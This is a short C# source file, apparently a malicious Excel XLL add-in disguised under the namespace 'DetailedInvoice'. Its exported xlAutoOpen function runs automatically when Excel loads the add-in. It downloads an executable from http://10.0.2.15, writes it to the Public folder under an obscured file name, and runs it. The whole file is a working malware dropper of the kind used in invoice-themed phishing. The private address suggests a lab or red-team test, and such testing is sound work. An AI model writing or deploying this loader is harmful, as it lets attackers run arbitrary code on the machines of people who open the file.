using System;
using System.Net;
using System.Diagnostics;
namespace DetailedInvoice
{
    class Program
    {
        [DllExport]
        static void xlAutoOpen()
        {
            string droplocation = Environment.GetEnvironmentVariable("Public") + "/srtherhaeth.eXe";
            WebClient client = new WebClient();
            client.DownloadFile("http://10.0.2.15/csrsc.exe", droplocation);
            Process.Start(droplocation);

        }
        static void Main(string[] args)
        {

        }
    }
}